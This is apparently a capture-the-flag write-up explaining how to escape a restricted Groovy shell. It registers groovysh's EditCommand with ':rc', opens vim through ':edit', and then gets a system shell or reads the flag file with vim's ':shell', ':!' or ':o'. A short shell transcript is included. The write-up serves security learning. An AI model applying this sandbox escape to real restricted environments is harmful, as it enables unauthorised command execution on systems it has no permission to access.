# Solution

Since the implementation uses `SecureASTCustomizer` which only allows `java.lang.Math` class and is quite restricting, there is not much to do to escape the groovysh with groovy.

Except for groovy code interpretation, groovysh supports other commands available for listing with `:help` input to the groovy shell. In order to escape the groovy shell, we can use the available `:rc` command which implements a registration of a new groovy shell command. 

All available commands are listed in the Groovy documentation - https://groovy-lang.org/groovysh.html#GroovyShell-RecognizedCommands

To get the name of the class and its full path might be a bit trickier, but they are all available in the Groovy's Github repository - https://github.com/apache/groovy/tree/master/subprojects/groovy-groovysh/src/main/groovy/org/apache/groovy/groovysh/commands

The easiest and intended way to get to the flag is to load the `org.apache.groovy.groovysh.commands.EditCommand` with the `:register` command and enter edit mode with `:e`:
```
Groovy Shell (3.0.9, JVM: 11.0.11)
Type ':help' or ':h' for help.
-------------------------------------------------------------------------------
groovy:000> :h
:h

For information about Groovy, visit:
    http://groovy-lang.org 

Available commands:
  :help      (:h ) Display this help message
  ?          (:? ) Alias to: :help
  :exit      (:x ) Exit the shell
  :quit      (:q ) Alias to: :exit
  :register  (:rc) Register a new command with the shell

For help on a specific command type:
    :help command 

groovy:000> :rc org.apache.groovy.groovysh.commands.EditCommand
:rc org.apache.groovy.groovysh.commands.EditCommand
===> true
groovy:000> :h
:h

  :help      (:h ) Display this help message
  ?          (:? ) Alias to: :help
  :exit      (:x ) Exit the shell
  :quit      (:q ) Alias to: :exit
  :register  (:rc) Register a new command with the shell
  :edit      (:e ) Edit the current buffer

For help on a specific command type:
    :help command 

groovy:000> 
```

When in `:edit` mode, `vim` window pops up which can open a shell with a simple `:shell` (do not forget to `stty raw -echo` in order for this to work). If `:shell` is not an option, we can also use `:o` to open the flag file from within `vim` or `:!` to execute any other command.
